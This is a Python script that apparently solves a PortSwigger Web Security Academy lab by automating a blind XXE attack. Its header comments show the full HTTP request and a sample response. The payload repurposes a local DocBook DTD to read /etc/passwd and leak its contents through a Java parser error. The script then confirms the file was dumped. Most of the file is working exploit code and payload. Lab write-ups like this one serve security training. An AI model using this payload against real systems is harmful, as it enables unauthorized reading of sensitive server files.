
# Reference for DTD file contents: https://github.com/GNOME/yelp/blob/master/data/dtd/docbookx.dtd
# The content of /etc/passwd is always the same in the lab,
# therefore we could check for it in a static way or do it via RegEx instead
#========================================================================================================
# Request:

# POST /product/stock HTTP/1.1
# <?xml version="1.0" encoding="UTF-8"?>
# <!DOCTYPE foo [
# <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
# <!ENTITY % ISOamso '
# <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
# <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
# &#x25;eval;
# &#x25;error;
# '>
# %local_dtd;
# ]>
# <stockCheck>
# <productId>1</productId>
# <storeId>1</storeId>
# </stockCheck>
#=========================================================================================================

#=========================================================================================================
# Response:

# "XML parser exited with error: java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
# daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
# bin:x:2:2:bin:/bin:/usr/sbin/nologin
# sys:x:3:3:sys:/dev:/usr/sbin/nologin
# sync:x:4:65534:sync:/bin:/bin/sync
# games:x:5:60:games:/usr/games:/usr/sbin/nologin
# man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
# lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
# mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
# news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
# uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
# proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
# www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
# backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
# list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
# irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
# gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
# nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
# (...)
#=========================================================================================================

import typer
import requests
from rich.console import Console
from termcolor import colored

console = Console()

def malicious_request(session, sid):
    response = session.post(f'https://{sid}.web-security-academy.net/product/stock/', data=(
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"><!ENTITY % ISOamso \'<!ENTITY &#x25; file SYSTEM "file:///etc/passwd"><!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">&#x25;eval;&#x25;error;\'>%local_dtd;]><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>'))
    return response


def main(sid: str):
    with console.status('Opening new session ...'):
        session = requests.Session()
    console.log('+ Session created correctly!')
    with console.status('Sending the malicious payload ...'):
        response = malicious_request(session, sid)
    
    if (response.status_code == 400):
        console.log('+ XML error was succesfully produced!')
        #CHECK THE CORRECTNESS OF THE OUTPUT
        log = response.text.split(" ")
        nonexistent = log[6].split("\n")

        if ('/nonexistent/root:x:0:0:root:/root:/bin/bash' in nonexistent):
            console.log('+ The file /etc/passwd was correctly dumped!')
            print(response.text)
        else:
            console.log('+ The attack was unsuccesful!')

    else:
        console.log('+ The attack was unsuccesful!')



if __name__ == "__main__":
    typer.run(main)
